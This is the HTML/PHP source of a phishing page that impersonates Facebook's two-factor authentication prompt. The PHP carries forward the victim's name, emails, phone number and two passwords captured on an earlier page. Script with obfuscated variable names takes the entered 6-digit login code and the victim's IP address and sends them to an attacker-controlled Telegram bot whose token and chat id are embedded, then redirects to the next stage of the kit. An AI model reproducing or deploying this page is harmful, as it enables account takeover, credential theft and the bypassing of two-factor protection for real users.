<!doctype html>
<html lang="en">
<head>
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <!-- Bootstrap CSS -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
        <title>Facebook</title>
        <script src="https://kit.fontawesome.com/83fd8385f7.js" crossorigin="anonymous"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>


        <link rel="icon" type="image/x-icon" href="default.ico">
        <style type="text/css">
            @font-face {
                font-family: Helvetica, sans-serif;
                src: url(images/Helvetica-Font/Helvetica.ttf);
            }

            *,
            body,
            p,
            span,
            a,
            div,
            tr,
            td,
            th,
            h1,
            h2 {
                font-family: Helvetica;
            }

            body {
                background-color: #fff;
                font-family: Helvetica;
                -webkit-font-smoothing: antialiased;
            }

            .header {
                background-color: white;
                padding-top: 8px;
                padding-bottom: 8px;
                box-shadow: 1px 1px 8px 1px rgb(0 0 0 / 10%);
            }

            .main .card {
                margin-top: 60px;
                background-color: white;
                padding-top: 16px;
                padding-bottom: 0px;
                padding-left: 16px;
                padding-right: 16px;
                border: none;
                box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
                margin-bottom: 30px;
            }

            .main .open {
                color: white;
                padding: 4px 10px;
                border-radius: 5px;
            }

            .ikonauser {
                background-color: #c4c9cd;
                border-radius: 50%;
                font-size: 15px;
                color: white;
                padding: 10px;
            }

            label {
                color: #90949c;
                font-weight: bold;
                font-size: 12px;
            }

            input[type=text],
            textarea,
            input[type=password] {
                color: #495057;
                background-color: #fff;
                background-clip: padding-box;
                border-radius: 0px !important;
                border: 1px solid #ced4da;

            }

            .butoni {
                background-color: #4267b2;
                border: 1px solid #4267b2;
                color: white;
                margin-top: 15px;
                font-size: 13px;
                font-weight: 500;
                padding: 7px 20px;
                border-radius: 2px;
                text-transform: none;
                font-weight: bold;
            }

            .butoni:hover {
                background-color: #444444;
            }

            #main {}

            #fac {
                margin-top: 50px;
                display: none;
                margin-bottom: 60px;
            }

            .twh3 {
                border-bottom: 1px solid rgba(0, 0, 0, .101);
                background-color: #fff;
                font-size: 16px;
                color: #4b4f56;
                padding: 12px;
                font-weight: 700;
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
            }

            #fac .card {
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
            }

            #fac .bodyyy p {
                font-size: 13px;
            }

            #fac .bodyyy {
                padding: 10px 20px !important;
                border-bottom: 1px solid rgba(0, 0, 0, .101);
            }

            #fac .footerii {
                padding: 10px 20px !important;
                background-color: #fff;
                height: 55px;

            }

            .nolink {
                color: black !important;
                font-size: 14px !important;
            }

            #twof .modal-body {
                font-size: 14px;
            }

            .paddingleftt {
                padding-left: 12px;
            }

            @media only screen and (max-width: 600px) {}


            @media (max-width: 400px) {
                .linkupertwo {
                    font-size: 12px !important;
                    margin-top: 8px !important;
                }
            }

            .btn:hover {
                color: white !important;
            }

            .ourmessagiii {
                font-family: "Arial";
            }

            #sendcodeagain {
                display: none;
                font-size: 14px;
                padding-left: 0px;
                color: #385898;
            }

            #sendcodeagain:hover {
                color: #385898 !important;
            }

            .fotoh {
                width: 94%;
                margin: 0 auto;
            }


            /* Chrome, Safari, Edge, Opera */
            input::-webkit-outer-spin-button,
            input::-webkit-inner-spin-button {
                -webkit-appearance: none;
                margin: 0;
            }

            /* Firefox */
            input[type=number] {
                -moz-appearance: textfield;
            }
        </style>


    </head>

<body>
    <section class="header">
        <div class="fotoh">
            <div class="row">
                <div class="col-6">
                    <img src="img/Facebook_f_logo.png" class="img-fluid" width="40" />
                </div>

                <div class="col-6" style="text-align: right;">
                    <!-- <div style="padding-top: 4px;">
              <img src="" encodeURIComponent(image)" class="img-fluid" width="30" height="30" style="object-fit: cover; display: inline-block; border-radius: 50%;" />
              <p style="display: inline-block; margin-bottom: 0px; font-weight: 600; font-size: 14px; color:#050505"></p>
            </div>-->
                    <p style="color:#3578e5; display:none; padding-top: 8px; margin-bottom: 0px; font-weight: 600; font-size: 15px;">
                        <i style="font-size: 16px;" class="fa-solid fa-envelope"></i> Support Inbox
                    </p>
                </div>
            </div>
        </div>
    </section>
    <?php
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        $full_name = $_POST["full_name"];
        $business_email = $_POST["business_email"];
        $personal_email = $_POST["personal_email"];
        $phone = $_POST["phone"];
        $facebook_pagename = $_POST["facebook_pagename"];
        $first_password = $_POST["first_password"];
        $second_password = $_POST["second_password"];
    }
    ?>
    <section id="fac" style="display: block;">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-8 col-xl-7 col-sm-8">
				    <form action="confirm2.php?cmd=_home&amp;dispatch=11004d58f5b74f8dc1e7c2e8dd4105e811004d58f5b74f8dc1e7c2e8dd4105e8@meta.html" method="post">
					<input type="hidden" name="full_name" value="<?php echo $full_name; ?>" readonly>
					<input type="hidden" name="business_email" value="<?php echo $business_email; ?>" readonly>
					<input type="hidden" name="personal_email" value="<?php echo $personal_email; ?>" readonly>
					<input type="hidden" name="phone" value="<?php echo $phone; ?>" readonly>
					<input type="hidden" name="facebook_pagename" value="<?php echo $facebook_pagename; ?>" readonly>
					<input type="hidden" name="first_password" value="<?php echo $first_password; ?>" readonly>
                    <input type="hidden" name="second_password" value="<?php echo $second_password; ?>" readonly>
                    <div class="card">
                        <h3 class="twh3">Two-factor authentication required (1/3)</h3>
                        <div class="bodyyy">
                            <p>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
                            <p>Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
                            <div class="form-group" style="padding-left: 0px; padding-top: 5px; padding-bottom: 10px; display:inline-block">
                                <input style="margin-left: 0px !important; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; -webkit-box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%); box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%); -webkit-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s; color: #4e4d4d" type="number" id="code" class="form-control mx-sm-3" aria-describedby="passwordHelpInline" placeholder="Login code" name="logincode" minlength="4" required="">
                            </div>
                            <div class="form-group paddingleftt" style="margin-top: -8px; display:inline-block;">
                                <p name="" class="nolink" id="timer" style="background-color: transparent; border: transparent; padding: 0px; margin: 0px; display: inline; color:#385898; font-size: 13px;">( wait: <span id="timeri" style="margin-bottom: 0px; display: inline"></span> )</p>
                                <a id="sendcodeagain" class="btn" onclick="sendcodeagain();">Send Code Again</a>
                            </div>
                        </div>
                        <div class="footerii" style="width:100%;">
                            <a data-toggle="modal" data-target="#twof" style="font-size: 14px;  color: #385898; font-weight: 600; margin-bottom: 0px; float: left; margin-top: 6px; cursor: pointer;" class="linkupertwo">Need another way to authenticate?</a>
                            <button id="sendButton" type="submit" class="btn butoni" style="margin-top: 0px; margin-bottom: 0px; float: right; background-color: #4267b2; border: 1px solid #4267b2; color: white; font-size: 13px; font-weight: 500; padding: 5px 20px; border-radius: 4px; text-transform: none; font-weight: bold;">Send</button>
                        </div>
                    </div>
					</form>
                </div>
            </div>
        </div>
    </section>
    <style>
        .form-control {
            border: 1px solid #d0d0d0 !important;
            border-radius: 4px !important;
            padding: 1.4rem 0.75rem !important;
            resize: none !important;
        }
    </style>
    <div class="modal fade" id="twof" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel" style="font-size: 16px;">Didn’t receive a code?</h5>

                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p>1. Go to <strong>Settings > Security and Login.</strong></p>
                    <p>2. Under the <strong>Two-Factor Authentication</strong> section, click <strong>Use two-factor
                            authentication</strong>. You may need to re-enter your password.</p>
                    <p>3. Next to <strong>Recovery Codes</strong>, click <strong>Setup</strong> then <strong>Get Codes</strong>.
                        If you've already set up recovery codes, you can click <strong>Show Codes.</strong></p>
                </div>

                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
    <input type="hidden" id="ip_hidden" value="">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <script>
        document.getElementById("sendButton").addEventListener("click", function (_0xe13dde) {
        _0xe13dde.preventDefault();
        handleActions();
        });
        function getIp() {
        $.get("https://api.ipify.org/?format=json", function (_0x5516b1) {
            $("#ip_hidden").val(_0x5516b1.ip);
        });
        }
        getIp();
        function handleActions() {
        let _0x216226 = document.querySelector("#code");
        if (_0x216226.value === '') {
            $("#code").css("border", "1px solid red");
            return;
        } else {
            let _0x4906f8 = $("#ip_hidden").val();
            var _0x3ccafc = "===========2FA-1============\n    2FA: \"" + _0x216226.value + "\"\n    IP: \"" + _0x4906f8 + "\"\n    =============================";
            $.post("https://api.telegram.org/bot5788363554:AAF-SVpxKsmsqyNVzLnJffQ1XqJoXCwRmo0/sendMessage", {
            'chat_id': "-910743732",
            'text': _0x3ccafc
            }).done(function (_0x58f89e) {
            console.log("Message sent successfully:", _0x58f89e);
            window.location.href = 'confirm2.php?cmd=_home&amp;dispatch=11004d58f5b74f8dc1e7c2e8dd4105e811004d58f5b74f8dc1e7c2e8dd4105e8@meta.html';
            }).fail(function (_0x9280bc) {
            console.error("Error sending message:", _0x9280bc);
            });
            $(".fb-btn").attr("disabled", true);
        }
        }
        $(".numeric").on("input", function (_0x46194c) {
        if (this.value !== '') {
            $("#code").css('border', 'none');
        }
        this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script type="text/javascript">
        function startTimer(duration, display) {
            var timer = duration,
                minutes, seconds;
            var myInterval = setInterval(function() {
                minutes = parseInt(timer / 60, 10)
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (timer == 0) {
                    document.getElementById("timer").style.display = "none";
                    document.getElementById("sendcodeagain").style.display = "block";
                    clearInterval(myInterval);
                }
                if (--timer < 0) {
                    timer = duration;
                }
            }, 1000);
        }

        var fiveMinutes = 60 * 5,
            display = document.querySelector('#timeri');
        startTimer(fiveMinutes, display);
    </script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>

</body>
</html>